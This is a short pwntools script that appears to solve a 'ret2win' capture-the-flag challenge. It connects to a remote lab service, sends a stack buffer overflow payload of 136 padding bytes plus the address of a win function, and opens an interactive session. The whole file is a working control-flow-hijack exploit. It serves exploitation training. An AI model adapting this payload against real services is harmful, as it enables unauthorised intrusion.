from pwn import *

context.arch = "amd64"
context.terminal = ['tmux', 'splitw', '-h']
context.binary = "../src/ret2win"

win = 0x4011d9

# p = process("./ret2win")
p = remote("10.212.173.64", 32217)
p.recvuntil(b"data:")
p.sendline(b"A"*128 + b"A"*8 + p64(win))

p.interactive()
